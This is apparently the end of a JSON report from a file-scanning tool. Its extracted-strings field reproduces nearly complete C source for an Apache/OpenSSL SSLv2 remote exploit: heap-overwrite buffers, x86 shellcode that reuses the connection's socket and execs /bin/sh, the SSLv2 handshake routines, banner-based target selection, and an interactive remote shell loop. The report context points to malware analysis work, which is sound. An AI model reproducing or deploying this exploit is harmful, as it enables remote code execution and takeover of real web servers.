            "unsigned char overwrite_session_id_length[] =",
            "\t\"AAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"\\x70\\x00\\x00\\x00\";",
            "unsigned char overwrite_next_chunk[] =",
            "\t\"AAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAA\"",
            "\t\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"",
            "\t\"AAAA\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"AAAA\"",
            "\t\"\\x01\\x00\\x00\\x00\"",
            "\t\"AAAA\"",
            "\t\"AAAA\"",
            "\t\"AAAA\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"AAAA\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"",
            "\t\"AAAAAAAA\"",
            "\t\"\\x00\\x00\\x00\\x00\"",
            "\t\"\\x11\\x00\\x00\\x00\"",
            "\t\"fdfd\"",
            "\t\"bkbk\"",
            "\t\"\\x10\\x00\\x00\\x00\"",
            "\t\"\\x10\\x00\\x00\\x00\"",
            "\t\"\\xeb\\x0a\\x90\\x90\"",
            "\t\"\\x90\\x90\\x90\\x90\"",
            "\t\"\\x90\\x90\\x90\\x90\"",
            "\t\"\\x31\\xdb\"",
            "\t\"\\x89\\xe7\"",
            "\t\"\\x8d\\x77\\x10\"",
            "\t\"\\x89\\x77\\x04\"",
            "\t\"\\x8d\\x4f\\x20\"",
            "\t\"\\x89\\x4f\\x08\"",
            "\t\"\\xb3\\x10\"",
            "\t\"\\x89\\x19\"",
            "\t\"\\x31\\xc9\"",
            "\t\"\\xb1\\xff\"",
            "\t\"\\x89\\x0f\"",
            "\t\"\\x51\"",
            "\t\"\\x31\\xc0\"",
            "\t\"\\xb0\\x66\"",
            "\t\"\\xb3\\x07\"",
            "\t\"\\x89\\xf9\"",
            "\t\"\\xcd\\x80\"",
            "\t\"\\x59\"",
            "\t\"\\x31\\xdb\"",
            "\t\"\\x39\\xd8\"",
            "\t\"\\x75\\x0a\"",
            "\t\"\\x66\\xb8\\x12\\x34\"",
            "\t\"\\x66\\x39\\x46\\x02\"",
            "\t\"\\x74\\x02\"",
            "\t\"\\xe2\\xe0\"",
            "\t\"\\x89\\xcb\"",
            "\t\"\\x31\\xc9\"",
            "\t\"\\xb1\\x03\"",
            "\t\"\\x31\\xc0\"",
            "\t\"\\xb0\\x3f\"",
            "\t\"\\x49\"",
            "\t\"\\xcd\\x80\"",
            "\t\"\\x41\"",
            "\t\"\\xe2\\xf6\"",
            "\t\"\\x31\\xc9\"",
            "\t\"\\xf7\\xe1\"",
            "\t\"\\x51\"",
            "\t\"\\x5b\"",
            "\t\"\\xb0\\xa4\"",
            "\t\"\\xcd\\x80\"",
            "\t\"\\x31\\xc0\"",
            "\t\"\\x50\"",
            "\t\"\\x68\"\"//sh\"",
            "\t\"\\x68\"\"/bin\"",
            "\t\"\\x89\\xe3\"",
            "\t\"\\x50\"",
            "\t\"\\x53\"",
            "\t\"\\x89\\xe1\"",
            "\t\"\\x99\"",
            "\t\"\\xb0\\x0b\"",
            "\t\"\\xcd\\x80\";",
            "#define BUFSIZE 16384",
            "#define CHALLENGE_LENGTH 16",
            "#define RC4_KEY_LENGTH 16",
            "#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)",
            "#define n2s(c,s)\t((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))\t )),c+=2)",
            "#define s2n(s,c)\t((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)\t )&0xff)),c+=2)",
            "typedef struct {",
            "\tint sock;",
            "\tunsigned char challenge[CHALLENGE_LENGTH];",
            "\tunsigned char master_key[RC4_KEY_LENGTH];",
            "\tunsigned char key_material[RC4_KEY_MATERIAL_LENGTH];",
            "\tint conn_id_length;",
            "\tunsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];",
            "\tX509 *x509;",
            "\tunsigned char* read_key;",
            "\tunsigned char* write_key;",
            "\tRC4_KEY* rc4_read_key;",
            "\tRC4_KEY* rc4_write_key;",
            "\tint read_seq;",
            "\tint write_seq;",
            "\tint encrypted;",
            "} ssl_conn;",
            "long getip(char *hostname) {",
            "\tstruct hostent *he;",
            "\tlong ipaddr;",
            "\tif ((ipaddr = inet_addr(hostname)) < 0) {",
            "\t\tif ((he = gethostbyname(hostname)) == NULL) exit(-1);",
            "\t\tmemcpy(&ipaddr, he->h_addr, he->h_length);",
            "\treturn ipaddr;",
            "int sh(int sock) {",
            "\tchar localip[256], rcv[1024];",
            "\tfd_set rset;",
            "\tint maxfd, n;",
            "       sleep(2);",
            "       write(sock, \"uname -a;id\\n\", strlen(\"uname -a;id\\n\"));",
            "       while (1) {",
            "\t\t\tfd_set          fds;",
            "\t\t\tint             n;",
            "\t\t\tstruct timeval  tv;",
            "\t\t\tchar buf[1024];",
            "\t\t\ttv.tv_sec = 5;",
            "\t\t\ttv.tv_usec = 0;",
            "\t\t\tFD_ZERO(&fds);",
            "\t\t\tFD_SET(0, &fds);",
            "\t\t\tFD_SET(sock, &fds);",
            "\t\t\tmemset(buf, 0, sizeof(buf));",
            "\t\t\tif(select(sock + 1, &fds, NULL, NULL, &tv) > 0) {",
            "\t\t\t\tif(FD_ISSET(sock, &fds)) {",
            "\t\t\t\t\tif((n = read(sock, buf, sizeof(buf) - 1)) <= 0)",
            "\t\t\t\t\t\tbreak;",
            "\t\t\t\t\twrite(1, buf, n);",
            "\t\t\t\t}",
            "\t\t\t\tif(FD_ISSET(0, &fds)) {",
            "\t\t\t\t\tif((n = read(0, buf, sizeof(buf) - 1)) < 0)",
            "\t\t\t\t\t\texit(1);",
            "\t\t\t\t\twrite(sock, buf, n);",
            "\t\t\t\t}",
            "\t\t\t}//end select",
            "\t\t}//end while",
            "int get_local_port(int sock) {",
            "\tstruct sockaddr_in s_in;",
            "\tunsigned int namelen = sizeof(s_in);",
            "\tif (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) exit(1);",
            "\treturn s_in.sin_port;",
            "int connect_host(char* host, int port) {",
            "\tstruct sockaddr_in s_in;",
            "\tint sock;",
            "\ts_in.sin_family = AF_INET;",
            "\ts_in.sin_addr.s_addr = getip(host);",
            "\ts_in.sin_port = htons(port);",
            "\tif ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) exit(1);",
            "\talarm(10);",
            "\tif (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) exit(1);",
            "\talarm(0);",
            "\treturn sock;",
            "ssl_conn* ssl_connect_host(char* host, int port) {",
            "\tssl_conn* ssl;",
            "\tif (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) exit(1);",
            "\tssl->encrypted = 0;",
            "\tssl->write_seq = 0;",
            "\tssl->read_seq = 0;",
            "\tssl->sock = connect_host(host, port);",
            "\treturn ssl;",
            "char res_buf[30];",
            "int read_data(int sock, unsigned char* buf, int len) {",
            "\tint l;",
            "\tint to_read = len;",
            "\tdo {",
            "\t\tif ((l = read(sock, buf, to_read)) < 0) exit(1);",
            "\t\tto_read -= len;",
            "\t} while (to_read > 0);",
            "\treturn len;",
            "int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size) {",
            "\tint rec_len, padding;",
            "\tread_data(ssl->sock, buf, 2);",
            "\tif ((buf[0] & 0x80) == 0) {",
            "\t\trec_len = ((buf[0] & 0x3f) << 8) | buf[1];",
            "\t\tread_data(ssl->sock, &buf[2], 1);",
            "\t\tpadding = (int)buf[2];",
            "\telse {",
            "\t\trec_len = ((buf[0] & 0x7f) << 8) | buf[1];",
            "\t\tpadding = 0;",
            "\tif ((rec_len <= 0) || (rec_len > buf_size)) exit(1);",
            "\tread_data(ssl->sock, buf, rec_len);",
            "\tif (ssl->encrypted) {",
            "\t\tif (MD5_DIGEST_LENGTH + padding >= rec_len) {",
            "\t\t\tif ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) return 0;",
            "\t\t\telse exit(1);",
            "\t\tRC4(ssl->rc4_read_key, rec_len, buf, buf);",
            "\t\trec_len = rec_len - MD5_DIGEST_LENGTH - padding;",
            "\t\tmemmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);",
            "\tif (buf[0] == SSL2_MT_ERROR) {",
            "\t\tif (rec_len != 3) exit(1);",
            "\t\telse return 0;",
            "\treturn rec_len;",
            "void send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tunsigned char* p;",
            "\tint tot_len;",
            "\tMD5_CTX ctx;",
            "\tint seq;",
            "\tif (ssl->encrypted) tot_len = rec_len + MD5_DIGEST_LENGTH;",
            "\telse tot_len = rec_len;",
            "\tif (2 + tot_len > BUFSIZE) exit(1);",
            "\tp = buf;",
            "\ts2n(tot_len, p);",
            "\tbuf[0] = buf[0] | 0x80;",
            "\tif (ssl->encrypted) {",
            "\t\tseq = ntohl(ssl->write_seq);",
            "\t\tMD5_Init(&ctx);",
            "\t\tMD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);",
            "\t\tMD5_Update(&ctx, rec, rec_len);",
            "\t\tMD5_Update(&ctx, &seq, 4);",
            "\t\tMD5_Final(p, &ctx);",
            "\t\tp+=MD5_DIGEST_LENGTH;",
            "\t\tmemcpy(p, rec, rec_len);",
            "\t\tRC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);",
            "\telse memcpy(p, rec, rec_len);",
            "\tsend(ssl->sock, buf, 2 + tot_len, 0);",
            "\tssl->write_seq++;",
            "void send_client_hello(ssl_conn *ssl) {",
            "\tint i;",
            "\tunsigned char buf[BUFSIZE] =",
            "\t\t\"\\x01\"",
            "\t\t\"\\x00\\x02\"",
            "\t\t\"\\x00\\x18\"",
            "\t\t\"\\x00\\x00\"",
            "\t\t\"\\x00\\x10\"",
            "\t\t\"\\x07\\x00\\xc0\\x05\\x00\\x80\\x03\\x00\"",
            "\t\t\"\\x80\\x01\\x00\\x80\\x08\\x00\\x80\\x06\"",
            "\t\t\"\\x00\\x40\\x04\\x00\\x80\\x02\\x00\\x80\"",
            "\t\t\"\";",
            "\tfor (i = 0; i < CHALLENGE_LENGTH; i++) ssl->challenge[i] = (unsigned char) (rand() >> 24);",
            "\tmemcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);",
            "\tsend_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);",
            "void get_server_hello(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tunsigned char *p, *end;",
            "\tint len;",
            "\tint server_version, cert_length, cs_length, conn_id_length;",
            "\tint found;",
            "\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);",
            "\tif (len < 11) exit(1);",
            "\tp = buf;",
            "\tif (*(p++) != SSL2_MT_SERVER_HELLO) exit(1);",
            "\tif (*(p++) != 0) exit(1);",
            "\tif (*(p++) != 1) exit(1);",
            "\tn2s(p, server_version);",
            "\tif (server_version != 2) exit(1);",
            "\tn2s(p, cert_length);",
            "\tn2s(p, cs_length);",
            "\tn2s(p, conn_id_length);",
            "\tif (len != 11 + cert_length + cs_length + conn_id_length) exit(1);",
            "\tssl->x509 = NULL;",
            "\tssl->x509=d2i_X509(NULL,&p,(long)cert_length);",
            "\tif (ssl->x509 == NULL) exit(1);",
            "\tif (cs_length % 3 != 0) exit(1);",
            "\tfound = 0;",
            "\tfor (end=p+cs_length; p < end; p += 3) if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80)) found = 1;",
            "\tif (!found) exit(1);",
            "\tif (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) exit(1);",
            "\tssl->conn_id_length = conn_id_length;",
            "\tmemcpy(ssl->conn_id, p, conn_id_length);",
            "void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {",
            "\tint encrypted_key_length, key_arg_length, record_length;",
            "\tunsigned char* p;",
            "\tint i;",
            "\tEVP_PKEY *pkey=NULL;",
            "\tunsigned char buf[BUFSIZE] =",
            "\t\t\"\\x02\"",
            "\t\t\"\\x01\\x00\\x80\"",
            "\t\t\"\\x00\\x00\"",
            "\t\t\"\\x00\\x40\"",
            "\t\t\"\\x00\\x08\";",
            "\tp = &buf[10];",
            "\tfor (i = 0; i < RC4_KEY_LENGTH; i++) ssl->master_key[i] = (unsigned char) (rand() >> 24);",
            "\tpkey=X509_get_pubkey(ssl->x509);",
            "\tif (!pkey) exit(1);",
            "\tif (pkey->type != EVP_PKEY_RSA) exit(1);",
            "\tencrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl->master_key, &buf[10], pkey->pkey.rsa, RSA_PKCS1_PADDING);",
            "\tif (encrypted_key_length <= 0) exit(1);",
            "\tp += encrypted_key_length;",
            "\tif (key_arg_overwrite) {",
            "\t\tfor (i = 0; i < 8; i++) *(p++) = (unsigned char) (rand() >> 24);",
            "\t\tmemcpy(p, key_arg_overwrite, key_arg_overwrite_len);",
            "\t\tkey_arg_length = 8 + key_arg_overwrite_len;",
            "\telse key_arg_length = 0;",
            "\tp = &buf[6];",
            "\ts2n(encrypted_key_length, p);",
            "\ts2n(key_arg_length, p);",
            "\trecord_length = 10 + encrypted_key_length + key_arg_length;",
            "\tsend_ssl_packet(ssl, buf, record_length);",
            "\tssl->encrypted = 1;",
            "void generate_key_material(ssl_conn* ssl) {",
            "\tunsigned int i;",
            "\tMD5_CTX ctx;",
            "\tunsigned char *km;",
            "\tunsigned char c='0';",
            "\tkm=ssl->key_material;",
            "\tfor (i=0; i<RC4_KEY_MATERIAL_LENGTH; i+=MD5_DIGEST_LENGTH) {",
            "\t\tMD5_Init(&ctx);",
            "\t\tMD5_Update(&ctx,ssl->master_key,RC4_KEY_LENGTH);",
            "\t\tMD5_Update(&ctx,&c,1);",
            "\t\tc++;",
            "\t\tMD5_Update(&ctx,ssl->challenge,CHALLENGE_LENGTH);",
            "\t\tMD5_Update(&ctx,ssl->conn_id, ssl->conn_id_length);",
            "\t\tMD5_Final(km,&ctx);",
            "\t\tkm+=MD5_DIGEST_LENGTH;",
            "void generate_session_keys(ssl_conn* ssl) {",
            "\tgenerate_key_material(ssl);",
            "\tssl->read_key = &(ssl->key_material[0]);",
            "\tssl->rc4_read_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));",
            "\tRC4_set_key(ssl->rc4_read_key, RC4_KEY_LENGTH, ssl->read_key);",
            "\tssl->write_key = &(ssl->key_material[RC4_KEY_LENGTH]);",
            "\tssl->rc4_write_key = (RC4_KEY*) malloc(sizeof(RC4_KEY));",
            "\tRC4_set_key(ssl->rc4_write_key, RC4_KEY_LENGTH, ssl->write_key);",
            "void get_server_verify(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tint len;",
            "\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);",
            "\tif (len != 1 + CHALLENGE_LENGTH) exit(1);",
            "\tif (buf[0] != SSL2_MT_SERVER_VERIFY) exit(1);",
            "\tif (memcmp(ssl->challenge, &buf[1], CHALLENGE_LENGTH)) exit(1);",
            "void send_client_finished(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tbuf[0] = SSL2_MT_CLIENT_FINISHED;",
            "\tmemcpy(&buf[1], ssl->conn_id, ssl->conn_id_length);",
            "\tsend_ssl_packet(ssl, buf, 1+ssl->conn_id_length);",
            "void get_server_finished(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tint len;",
            "\tint i;",
            "\tif (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) exit(1);",
            "\tif (buf[0] != SSL2_MT_SERVER_FINISHED) exit(1);",
            "\tif (len <= 112) exit(1);",
            "\tcipher = *(int*)&buf[101];",
            "\tciphers = *(int*)&buf[109];",
            "void get_server_error(ssl_conn* ssl) {",
            "\tunsigned char buf[BUFSIZE];",
            "\tint len;",
            "\tif ((len = read_ssl_packet(ssl, buf, sizeof(buf))) > 0) exit(1);",
            "void exploit(int os,char *ip,int port) {",
            "\tint i;",
            "\tint arch=-1;",
            "\tint N = 20;",
            "\tssl_conn* ssl1;",
            "\tssl_conn* ssl2;",
            "\tchar *a;",
            "\talarm(3600);",
            "\tarch  = os ;",
            "\tif (os ==-1)",
            "\t\tif ((a=GetAddress(ip)) == NULL) exit(0);",
            "\t\tif (strncmp(a,\"Apache\",6)) exit(0);",
            "\t\tfor (i=0;architectures[i].os!=NULL;i++) {",
            "\t\t\tif (strstr(a,architectures[i].apache) && strstr(a,architectures[i].os)) {",
            "\t\t\t\tarch=i;",
            "\t\t\t\tbreak;",
            "\t\t\t}",
            "\t\tif (arch == -1) arch=10;",
            "\tsrand(0x31337);",
            "\tfor (i=0; i<N; i++) {",
            "\t\tconnect_host(ip, port);",
            "\t\tusleep(100000);",
            "\tssl1 = ssl_connect_host(ip, port);",
            "\tssl2 = ssl_connect_host(ip, port);",
            "\tsend_client_hello(ssl1);",
            "\tget_server_hello(ssl1);",
            "\tsend_client_master_key(ssl1, overwrite_session_id_length, sizeof(overwrite_session_id_length)-1);",
            "\tgenerate_session_keys(ssl1);",
            "\tget_server_verify(ssl1);",
            "\tsend_client_finished(ssl1);",
            "\tget_server_finished(ssl1);",
            "\tport = get_local_port(ssl2->sock);",
            "\toverwrite_next_chunk[FINDSCKPORTOFS] = (char) (port & 0xff);",
            "\toverwrite_next_chunk[FINDSCKPORTOFS+1] = (char) ((port >> 8) & 0xff);",
            "\t*(int*)&overwrite_next_chunk[156] = cipher;",
            "\t*(int*)&overwrite_next_chunk[192] = architectures[arch].func_addr - 12;",
            "\t*(int*)&overwrite_next_chunk[196] = ciphers + 16;",
            "\tsend_client_hello(ssl2);",
            "\tget_server_hello(ssl2);",
            "\tsend_client_master_key(ssl2, overwrite_next_chunk, sizeof(overwrite_next_chunk)-1);",
            "\tgenerate_session_keys(ssl2);",
            "\tget_server_verify(ssl2);",
            "\tfor (i = 0; i < ssl2->conn_id_length; i++) ssl2->conn_id[i] = (unsigned char) (rand() >> 24);",
            "\tsend_client_finished(ssl2);",
            "\tget_server_error(ssl2);",
            "\tsh(ssl2->sock);",
            "\tclose(ssl2->sock);",
            "\tclose(ssl1->sock);",
            "\texit(0);",
            "int main(int argc, char * argv[])",
            "\tint port = 443;",
            "    int os,i;",
            "\tif (argc < 3)",
            "\tprintf(\"APACHE + OPENSSL EXPLOIT\\n\\n\");",
            "\tfor (i=0;architectures[i].os!=NULL;i++) ",
            "\t\tprintf(\"target %d  %s %s %p\\n\",i,architectures[i].os,architectures[i].apache,architectures[i].func_addr);",
            "\tprintf(\"\\n\");",
            "\tprintf(\"usage:%s target hostip [port]\\n\",argv[0]);",
            "\tprintf(\"usage:%s auto hostip [port] to auto select target\\n\",argv[0]);",
            "\texit(0);",
            "\tif (argc >3 )",
            "\t\tport = atoi(argv[3]);",
            "\tif (strcmp(\"auto\",argv[1])==0)",
            "\t\tos = -1;",
            "\telse os =atoi(argv[1]);",
            "\texploit(os,argv[2],port);",
            "\treturn 0;"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.374183",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
